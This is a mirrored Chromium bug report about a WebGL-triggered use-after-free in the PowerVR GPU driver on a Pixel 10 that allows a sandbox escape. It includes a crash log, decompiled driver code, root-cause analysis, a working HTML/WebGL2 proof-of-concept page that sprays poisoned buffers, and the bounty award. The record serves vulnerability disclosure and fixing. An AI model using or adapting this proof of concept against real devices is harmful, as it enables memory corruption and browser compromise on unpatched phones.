# UAF in KEGLGetPoolBuffers cause chrome sandbox escape

| Field | Value |
|-------|-------|
| **Issue ID** | [475396626](https://issues.chromium.org/issues/475396626) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>GPU |
| **Platforms** | Android |
| **Reporter** | ha...@gmail.com |
| **Assignee** | ge...@google.com |
| **Created** | 2026-01-13 |
| **Bounty** | $25,000.00 |

## Description

Chrome Version: [143.0.7499.192] + Stable

Operating System: pixel10,BP4A.260105.004.E1

REPRODUCTION CASE:

1、launch chrome with MTE

2、<http://127.0.0.1:8080/poc.html>

3、logcat | grep DEBUG

```
01-13 18:21:53.846 20418 20418 F DEBUG   : Learn more about MTE reports: https://source.android.com/docs/security/test/memory-safety/mte-reports
01-13 18:24:03.542 20554 20554 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
01-13 18:24:03.542 20554 20554 F DEBUG   : Build fingerprint: 'google/frankel/frankel:16/BP4A.260105.004.E1/14587043:user/release-keys'
01-13 18:24:03.542 20554 20554 F DEBUG   : Kernel Release: '6.6.98-android15-8-g4b48560cd07d-ab14239520-4k'
01-13 18:24:03.542 20554 20554 F DEBUG   : Revision: 'MP1.0'
01-13 18:24:03.542 20554 20554 F DEBUG   : ABI: 'arm64'
01-13 18:24:03.542 20554 20554 F DEBUG   : Timestamp: 2026-01-13 18:24:03.401257381+0800
01-13 18:24:03.542 20554 20554 F DEBUG   : Process uptime: 130s
01-13 18:24:03.542 20554 20554 F DEBUG   : Executable: /system/bin/app_process64
01-13 18:24:03.542 20554 20554 F DEBUG   : Cmdline: com.android.chrome:privileged_process4
01-13 18:24:03.542 20554 20554 F DEBUG   : pid: 20428, tid: 20445, name: CrGpuMain  >>> com.android.chrome:privileged_process4 <<<
01-13 18:24:03.542 20554 20554 F DEBUG   : uid: 10214
01-13 18:24:03.542 20554 20554 F DEBUG   : tagged_addr_ctrl: 000000000007fff3 (PR_TAGGED_ADDR_ENABLE, PR_MTE_TCF_SYNC, mask 0xfffe)
01-13 18:24:03.542 20554 20554 F DEBUG   : pac_enabled_keys: 000000000000000f (PR_PAC_APIAKEY, PR_PAC_APIBKEY, PR_PAC_APDAKEY, PR_PAC_APDBKEY)
01-13 18:24:03.542 20554 20554 F DEBUG   : esr: 0000000092000051 (Data Abort Exception 0x24)
01-13 18:24:03.542 20554 20554 F DEBUG   : signal 11 (SIGSEGV), code 9 (SEGV_MTESERR), fault addr 0x00000071ec323178 (write)
01-13 18:24:03.542 20554 20554 F DEBUG   :     x0  0000000000017ecc  x1  0000000000000000  x2  0000007049fb2b00  x3  0c0000713c2c7040
01-13 18:24:03.542 20554 20554 F DEBUG   :     x4  0000007000c25120  x5  0000000000000004  x6  0000000000000020  x7  0000000000000000
01-13 18:24:03.542 20554 20554 F DEBUG   :     x8  09000071ec322b40  x9  0a0000723c2c7c50  x10 0000000000019000  x11 0000000000017ed0
01-13 18:24:03.542 20554 20554 F DEBUG   :     x12 000000001e91629b  x13 0000000020e8f2e1  x14 0000000000000001  x15 0a0000712c3211f0
01-13 18:24:03.542 20554 20554 F DEBUG   :     x16 000000705a5d2548  x17 00000073368acaa0  x18 0000006f7ddc8000  x19 000000000000000a
01-13 18:24:03.542 20554 20554 F DEBUG   :     x20 0c0000713c2c7040  x21 0f0000718c2a4e50  x22 04000071ec376fa0  x23 0000000000000000
01-13 18:24:03.542 20554 20554 F DEBUG   :     x24 020000728c2a7a30  x25 000000705a8aff50  x26 020000728c2a7a38  x27 0a0000723c2c7c50
01-13 18:24:03.542 20554 20554 F DEBUG   :     x28 04000071ec3775d8  x29 0000007000c25270
01-13 18:24:03.542 20554 20554 F DEBUG   :     lr  000000705a8802d8  sp  0000007000c25210  pc  000000705a880320  pst 0000000060001000
01-13 18:24:03.542 20554 20554 F DEBUG   :     esr 0000000092000051
01-13 18:24:03.542 20554 20554 F DEBUG   : 33 total frames
01-13 18:24:03.542 20554 20554 F DEBUG   : backtrace:
01-13 18:24:03.542 20554 20554 F DEBUG   :       #00 pc 000000000003e320  /vendor/lib64/libIMGegl.so (KEGLGetPoolBuffers+336) (BuildId: 7a27a2f9d879a3ca30021fac7ba9f896)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #01 pc 000000000009d06c  /vendor/lib64/egl/libGLESv2_powervr.so (PrepareToDraw+6428) (BuildId: 5c09bdbf5bedc8055689e500629872cc)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #02 pc 0000000000098d5c  /vendor/lib64/egl/libGLESv2_powervr.so (DoClear+668) (BuildId: 5c09bdbf5bedc8055689e500629872cc)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #03 pc 000000000013ea18  /vendor/lib64/egl/libGLESv2_powervr.so (glClear+200) (BuildId: 5c09bdbf5bedc8055689e500629872cc)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #04 pc 0000000008acfcb8  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #05 pc 0000000008ad01c4  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #06 pc 0000000008aae978  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #07 pc 0000000008ad18dc  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #08 pc 000000000722a70c  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #09 pc 00000000072299e4  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #10 pc 00000000072296d0  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #11 pc 000000000722957c  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #12 pc 00000000072293dc  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #13 pc 0000000006f84c54  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #14 pc 00000000073437fc  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #15 pc 00000000058cbe18  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #16 pc 0000000005867ac4  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #17 pc 000000000586762c  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #18 pc 0000000007297504  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #19 pc 00000000058d4ff4  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #20 pc 0000000005846a8c  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #21 pc 000000000580f3d8  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #22 pc 000000000580f114  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #23 pc 0000000000d47db0  /data/misc/apexdata/com.android.art/dalvik-cache/arm64/boot.oat (art_jni_trampoline+112)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #24 pc 00000000006687e8  /apex/com.android.art/lib64/libart.so (nterp_helper+152) (BuildId: be34fbe63ff357beb403f9cb39923ea7)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #25 pc 00000000000e8512  /data/app/~~FwVb9WFnuU0uJppmlIgN9A==/com.android.chrome-cgd3VwCxxgxc7ycdyE7ilA==/base.apk (offset 0x1b0000) (ak3.run+562)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #26 pc 000000000031d5f0  /data/misc/apexdata/com.android.art/dalvik-cache/arm64/boot.oat (java.lang.Thread.run+64)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #27 pc 00000000002cdd94  /apex/com.android.art/lib64/libart.so (art_quick_invoke_stub+612) (BuildId: be34fbe63ff357beb403f9cb39923ea7)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #28 pc 000000000026e624  /apex/com.android.art/lib64/libart.so (art::ArtMethod::Invoke(art::Thread*, unsigned int*, unsigned int, art::JValue*, char const*)+220) (BuildId: be34fbe63ff357beb403f9cb39923ea7)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #29 pc 00000000004c3f30  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallback(void*)+1184) (BuildId: be34fbe63ff357beb403f9cb39923ea7)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #30 pc 00000000004c3a80  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallbackWithUffdGc(void*)+8) (BuildId: be34fbe63ff357beb403f9cb39923ea7)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #31 pc 000000000008a314  /apex/com.android.runtime/lib64/bionic/libc.so (__pthread_start(void*) (.__uniq.67847048707805468364044055584648682506)+180) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37)
01-13 18:24:03.542 20554 20554 F DEBUG   :       #32 pc 000000000007b1f4  /apex/com.android.runtime/lib64/bionic/libc.so (__start_thread+68) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37)
01-13 18:24:03.542 20554 20554 F DEBUG   : Learn more about MTE reports: https://source.android.com/docs/security/test/memory-safety/mte-reports

```

## Attachments

- [androidoob2.html](attachments/androidoob2.html) (text/html, 12.5 KB)

## Timeline

### li...@chromium.org (2026-01-13)

I couldn't repro this one on my pixel 10 device, do you have a minimized poc?

Also, is it possible for you to run a chrome build with `symbol_level=2` set in the gn args? You might get a symbolized trace for your reports that way and it'll be easier to triage them.

### ha...@gmail.com (2026-02-17)

Hello, I can confirm that the vulnerability at <https://issues.chromium.org/issues/475396626> is not affected by this patch. Could you please change the status of this vulnerability? Thank you.

### pe...@google.com (2026-02-18)

@ha...@gmail.com I think you mean <https://g-issues.chromium.org/issues/474266014>

Aka this is a different issue/vulnerability than the original suggested duplicate.
I have assigned to Geoff as he is looking into all these webgl vulns

### pe...@google.com (2026-02-18)

Thank you for providing more feedback. Adding the requester to the CC list.

### ha...@gmail.com (2026-02-18)

I have tested it after apply patch with build my own chromium.It still can be reproduced.

### ha...@gmail.com (2026-02-20)

```


void BufPoolFreeBuffers(long *param_1)

{
  long lVar1;
  uint uVar2;
  ulong uVar3;
  undefined8 *puVar4;
  long lVar5;
  long *plVar6;
  long lVar7;
  long lVar8;
  undefined8 *puVar9;
  long *plVar10;
  long *__ptr;
  long lVar11;
  long lVar12;
  
  puVar4 = *(undefined8 **)(*param_1 + 0x188);
  PVRSRVLockMutex(*puVar4);
  PVRSRVLockMutex(*(undefined8 *)(*(long *)puVar4[0xc] + 0x10));
  lVar11 = 10;
  do {
    lVar7 = lVar11 + -10;
    puVar9 = (undefined8 *)param_1[lVar11 + 0xbd];
    lVar12 = *param_1;
    lVar1 = param_1[0xa9];
    lVar8 = *(long *)(lVar12 + 0x188);
    lVar5 = *(long *)(lVar12 + 0x50);
    if ((puVar9 == (undefined8 *)0x0) || ((long *)*puVar9 != param_1)) {
LAB_0013de14:
      uVar2 = *(uint *)(lVar5 + 0x14);
      __ptr = *(long **)(lVar8 + 8 + lVar7 * 8);
      if (uVar2 == 0) {
        uVar2 = PVRSRVAtomicRead(lVar12 + 0x1f0);
      }
      if (__ptr != (long *)0x0) {
        lVar5 = lVar8 + 0x40;
        plVar10 = (long *)0x0;
        do {
          while( true ) {
            if (*(uint *)(lVar5 + lVar7 * 4) <= uVar2) goto LAB_0013ddb0;
            if (((*(byte *)(__ptr + 2) & 1) != 0) ||
               ((*__ptr != 0 &&
                (uVar3 = RM_IsResourceNeeded_NoLock(*(undefined8 *)(lVar8 + 0x60),__ptr + 4,1),
                (uVar3 & 1) != 0)))) break;
            CBUF_DestroyBufferGLES(__ptr[3],*(undefined4 *)(lVar12 + 0x198),(int)lVar1);
            if (*__ptr != 0) {
              *(undefined8 *)(*__ptr + lVar7 * 8 + 0x638) = 0;
              *__ptr = 0;
            }
            plVar6 = (long *)__ptr[0x15];
            if (plVar10 == (long *)0x0) {
              *(long **)(lVar8 + 8 + lVar7 * 8) = plVar6;
            }
            else {
              plVar10[0x15] = (long)plVar6;
            }
            RM_ClearResource_NoLock(*(undefined8 *)(lVar12 + 0x1d8),__ptr + 4);
            free(__ptr);
            *(int *)(lVar5 + lVar7 * 4) = *(int *)(lVar5 + lVar7 * 4) + -1;
            __ptr = plVar6;
            if (plVar6 == (long *)0x0) goto LAB_0013ddb0;
          }
          plVar6 = __ptr + 0x15;
          plVar10 = __ptr;
          __ptr = (long *)*plVar6;
        } while ((long *)*plVar6 != (long *)0x0);
      }
    }
    else {
      uVar3 = RM_IsResourceNeeded_NoLock(*(undefined8 *)(lVar12 + 0x1d8),puVar9 + 4,1);
      if ((uVar3 & 1) == 0) {
        *puVar9 = 0;
        *(undefined1 *)(puVar9 + 2) = 0;
        param_1[lVar11 + 0xbd] = 0;
        goto LAB_0013de14;
      }
      PVRSRVDebugPrintf(2,&DAT_00107002,0x235,
                        "BufPoolFreeBuffer: fragment buffer for render surface still in use");
    }
LAB_0013ddb0:
    lVar11 = lVar11 + 1;
    if (lVar11 == 0x11) {
      PVRSRVUnlockMutex(*(undefined8 *)(*(long *)puVar4[0xc] + 0x10));
      PVRSRVUnlockMutex(*puVar4);
      return;
    }
  } while( true );
}




```

The Root Cause: Flawed Lifecycle Teardown
The fundamental issue lies in how the driver handles the destruction of an EGLRenderSurface. When a surface is destroyed, BufPoolFreeBuffers is called to traverse the shared buffer pool (BufPool) and nullify any pointers (psListEntry->psRenderSurface) referencing the dying surface.

However, this cleanup logic contains two critical architectural bypasses that leave dangling pointers in the pool:

The Hardware Busy Bailout: If a buffer is still actively being processed by the GPU hardware when the surface teardown is initiated (e.g., RM\_IsResourceNeeded\_NoLock returns true), the driver logs an error and immediately bails out (return or break) without clearing the pointer to the dying surface.

The Minimum Pool Size Bypass (Shrink Bypass): When iterating through the pool to free unused buffers, if the total number of buffers in the pool is less than or equal to a predefined minimum threshold, the driver skips the cleanup loop entirely. This allows dormant buffers with stale pointers to survive the teardown process.

### ha...@gmail.com (2026-02-20)

This vulnerability can also be fixed at the Chrome level.

### ha...@gmail.com (2026-02-25)

deleted

### ch...@google.com (2026-03-04)

geofflang: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.[internal debugging info: security\_nag\_check]

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### ha...@gmail.com (2026-03-05)

mini poc

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PowerVR UAF - Original Logic + Fast Poison</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
        .console { background: #050505; border: 1px solid #0a0; height: 500px; overflow-y: auto; padding: 10px; }
        .crash { color: #fff; background: #d32f2f; font-weight: bold; }
    </style>
</head>
<body>
    <h2>PowerVR Lifecycle Mutation + Fast Poison</h2>
    <div id="stats" style="color:#fff">Iteration: 0 | Target: 640B</div>
    <div id="log" class="console"></div>
    <canvas id="fuzzCanvas" width="64" height="64" style="display:none;"></canvas>

<script>
    const logEl = document.getElementById('log');
    const gl = document.getElementById('fuzzCanvas').getContext('webgl2');
    let iter = 0;

    function log(msg, type = "") {
        const line = document.createElement('div');
        line.textContent = `[${new Date().getMilliseconds()}] ${msg}`;
        if(type) line.className = type;
        logEl.appendChild(line);
        if(iter % 5 === 0) logEl.scrollTop = logEl.scrollHeight;
    }

    document.getElementById('fuzzCanvas').addEventListener('webglcontextlost', (e) => {
        e.preventDefault();
        log("!!! [HIT] GPU PROCESS CRASHED !!!", "crash");
        alert("Exploit Success!");
    }, false);

    function runIteration() {
        try {

            const tex = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, tex);
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 16, 16, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);

            const fb1 = gl.createFramebuffer();
            const fb2 = gl.createFramebuffer();


            gl.bindFramebuffer(gl.FRAMEBUFFER, fb1);
            gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
            gl.clear(gl.COLOR_BUFFER_BIT); 
            gl.finish();

            gl.bindFramebuffer(gl.FRAMEBUFFER, fb2);
            gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);


            gl.bindFramebuffer(gl.FRAMEBUFFER, null); 
            gl.deleteFramebuffer(fb1); 


            const poison = [];
            const payload = new Uint32Array(640 / 4); 
            payload.fill(0x41414141); 

            for(let i=0; i<5; i++) {
                const b = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, b);
                gl.bufferData(gl.ARRAY_BUFFER, payload, gl.STATIC_DRAW);
                poison.push(b);
            }

            gl.bindFramebuffer(gl.FRAMEBUFFER, fb2);
            

            gl.clear(gl.COLOR_BUFFER_BIT);
            gl.finish();


            poison.forEach(b => gl.deleteBuffer(b));
            gl.deleteTexture(tex);
            gl.deleteFramebuffer(fb2);

        } catch(e) {}

        iter++;
        document.getElementById('stats').textContent = `Iteration: ${iter}`;
        setTimeout(runIteration, 5);
    }

    if(gl) runIteration();
</script>
</body>
</html>

```

### ge...@google.com (2026-03-06)

This is now fixed upstream by the vendor and will be rolled out in the next OS update. I will potentially be able to work around it at the Chrome/ANGLE level.

### ch...@google.com (2026-03-15)

We commit ourselves to a 60 day deadline for fixing for s1 severity vulnerabilities, and have exceeded it here. If you're unable to look into this soon, could you please find another owner or remove yourself so that this gets back into the security triage queue?

### ch...@google.com (2026-03-21)

geofflang: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.[internal debugging info: security\_nag\_check]

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### sp...@google.com (2026-04-02)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $25000.00 for this report.

Rationale for this decision:
Baseline. Sandbox escape / Memory corruption in a non-sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-06-30)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/475396626)*
